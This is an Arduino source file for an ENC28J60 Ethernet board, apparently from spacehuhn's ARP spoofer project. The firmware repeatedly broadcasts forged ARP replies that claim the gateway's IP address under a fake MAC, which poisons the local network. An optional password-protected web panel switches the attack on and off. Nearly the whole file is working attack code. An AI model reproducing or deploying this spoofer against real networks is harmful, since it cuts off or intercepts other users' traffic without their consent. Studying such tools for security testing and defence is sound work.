/*
  ===========================================
       Copyright (c) 2017 Stefan Kremser
              github.com/spacehuhn
  ===========================================
*/

#include <enc28j60.h>
#include <EtherCard.h>
#include <net.h>

// ===== Settings ===== //
//#define webinterface /* <-- uncomment that if you want to use the webinterface */
//#define debug /* <-- uncomment that if you want to get a serial output */
#define led 13
#define auth_password "ARP"
int packetRate = 20; //packets send per second
static uint8_t mymac[] = { 0xc0, 0xab, 0x03, 0x22, 0x55, 0x99 };

#ifdef webinterface
byte Ethernet::buffer[700];
#else
byte Ethernet::buffer[400];
#endif

int arp_count = 0;
unsigned long prevTime = 0;
bool connection = false;
bool toggle_status = false;
bool tmp_status = true;

//ARP reply packet
uint8_t _data[48] = {
  /* 0  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //destination MAC
  /* 6  */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source MAC
  /* 12 */ 0x08, 0x06, //frame type (ARP)
  /* 14 */ 0x00, 0x01, //ethernet
  /* 16 */ 0x08, 0x00, //ipv4
  /* 18 */ 0x06, 0x04, //size, protocol size
  /* 20 */ 0x00, 0x02, //opcode (1:request, 2:reply)
  /* 22 */ 0x01, 0x01, 0x01, 0x01c, 0x01, 0x01, //source MAC
  /* 28 */ 0xc0, 0xa8, 0x02, 0x01, //source IP
  /* 32 */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //destination MAC
  /* 38 */ 0xFF, 0xFF, 0xFF, 0xFF, //destination IP (255.255.255.255)
};

bool sendARP() {
  long curTime = millis();

   if (curTime - prevTime > 1000/packetRate) {
    digitalWrite(led, HIGH);

    for (int i = 0; i < 48; i++) ether.buffer[i] = _data[i];
    ether.packetSend(48);
    arp_count++;
    prevTime = curTime;

    digitalWrite(led, LOW);

#ifdef debug
    Serial.println("ARP PACKET SENT");
#endif

    return true;
  }

  return false;
}

void _connect() {
  if (!ether.dhcpSetup()) {
#ifdef debug
    Serial.println("DHCP failed");
#endif
    connection = false;
  } else {
#ifdef debug
    ether.printIp("My IP: ", ether.myip);
    ether.printIp("Netmask: ", ether.netmask);
    ether.printIp("GateWay IP: ", ether.gwip);
    ether.printIp("DNS IP: ", ether.dnsip);
#endif

    //set gateway IP
    for (int i = 0; i < 4; i++) _data[28 + i] =  ether.gwip[i];

    //set fake MAC
    for (int i = 0; i < 6; i++) _data[6 + i] = _data[22 + i] = mymac[i];

    //fill buffer
    for (int i = 0; i < 48; i++) ether.buffer[i] = _data[i];

    connection = true;
  }
}

void setup() {
  pinMode(led, OUTPUT);

#ifdef debug
  Serial.begin(115200);
  delay(2000);
  Serial.println("ready!");
  Serial.println("waiting for LAN connection...");
#endif

  if (ether.begin(sizeof Ethernet::buffer, mymac) == 0) {
#ifdef debug
    Serial.println( "Failed to access Ethernet controller");
#endif
  }

  while (!connection) {
    _connect();
    delay(1000);
  }

}

void loop() {
#ifdef webinterface

  char len = ether.packetReceive();
  char pos = ether.packetLoop(len);
  tmp_status = false;

  if (pos) {
    boolean password_valid = true;

    // is it a POST request?
    if (strstr((char *)Ethernet::buffer + pos, "POST /") != 0) {

      #ifdef debug
      Serial.println("New Post Request!");
      #endif
        
      // search and verify the password
      String password = "";
      char* password_position = strstr((char *)Ethernet::buffer + pos, "pwd=");
      if (password_position != 0) {
        password = String(password_position).substring(4);
        
        password = password.substring(0,password.indexOf("&O"));
        
        #ifdef debug
        Serial.println("Found password: '" + (String)password + "'");
        #endif
        if(password == auth_password) {
          #ifdef debug
          Serial.println("password correct :)");
          #endif
        } else {
          #ifdef debug
          Serial.println("wrong password! :(");
          #endif
          password_valid = false;
        }

        if(password_valid){
          // OFF command
          if (strstr((char *)Ethernet::buffer + pos, "&OFF=") != 0) {
            if (toggle_status) {
              #ifdef debug
              Serial.println("attack: OFF");
              #endif
              toggle_status = false;
              tmp_status = true;
            }
  
            // ON command
          } else if (strstr((char *)Ethernet::buffer + pos, "&ON=") != 0) {
            #ifdef debug
            Serial.println("attack: ON");
            #endif
            toggle_status = true;
            tmp_status = true;
          } else {
            #ifdef debug
            Serial.println("unknown command");
            #endif
          }
        }
      }
    } else {
      tmp_status = true;
    }

    // Output HTML page
    BufferFiller bfill = ether.tcpOffset();

    bfill.emit_p(PSTR(
      "HTTP/1.0 200 OK\n"
      "Content-Type: text/html\n\n"
      "<!Doctype html>"
        "<html>"
          "<head>"
            "<title>ARP Panel</title>"
            "<meta charset='utf-8'>"
          "</head>"
          "<body>"
            "<h1>ARP Spoofer - WebPanel</h1>"
            "<p>More info on the <a href=\"https://github.com/spacehuhn/enc28j60_ARPspoofer\">GitHub</a> page</p>"
            "<form method=\"POST\">"
              "<input type=\"password\" name=\"pwd\">"
    ));
    
    // Enable / disable buttons based on the output status
    if (toggle_status == true) bfill.emit_p(PSTR("<button name=\"OFF\">Turn OFF</button>"));
    else bfill.emit_p(PSTR("<button name=\"ON\">Turn ON</button>"));

    bfill.emit_p(PSTR("</form><p>"));

    if(!password_valid) bfill.emit_p(PSTR("<b>Wrong password!</b><br><br>"));
    
    long t = millis() / 1000;
    word h = t / 3600;
    byte m = (t / 60) % 60;
    byte s = t % 60;
    bfill.emit_p(PSTR("Uptime: $D$D:$D$D:$D$D<br>"), h / 10, h % 10, m / 10, m % 10, s / 10, s % 10);
    bfill.emit_p(PSTR("ARP packets sent: $D<br>"), arp_count);

    bfill.emit_p(PSTR("</p></body></html>"));
    ether.httpServerReply(bfill.position());
  } else {
    tmp_status = true;
    if (connection && toggle_status && tmp_status) {
      sendARP();
      tmp_status = false;
    } else {
      digitalWrite(13, LOW);  // No Connection, turn off STATUS LED
    }
  }

#else
  if (connection) sendARP();
  else digitalWrite(led, LOW); //No Connection, turn off STATUS LED
#endif
}

